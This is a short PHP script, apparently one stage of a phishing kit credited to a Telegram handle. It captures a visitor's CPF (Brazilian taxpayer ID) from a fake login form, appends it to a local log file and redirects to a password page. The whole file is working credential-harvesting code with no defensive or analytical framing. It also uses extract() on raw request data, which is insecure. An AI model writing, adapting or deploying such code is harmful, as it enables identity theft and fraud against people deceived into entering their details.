<?php

$contador_file = "./continfo.txt";


if (file_exists($contador_file)) {

    $contador = intval(file_get_contents($contador_file));
    
    $contador++;
} else {

    $contador = 1;
}

extract($_REQUEST);

    $file=fopen("./salves/login.txt","a");

if ($file) {
    if (flock($file, LOCK_EX)) {
        try {
            fwrite($file, "\nCPF: $cpf\n");
            flock($file, LOCK_UN);
            fclose($file);
            header("location: senha.html");
        } catch (Exception $e) {
            echo "Erro ao escrever no arquivo: " . $e->getMessage();
        }
    } else {
        echo "Erro ao obter o bloqueio no arquivo.";
    }
} else {
    echo "Erro ao abrir o arquivo.";
}

////// TELA LOGIN FEITA PELO @TXT_JPGI1 <--- telegram


?>
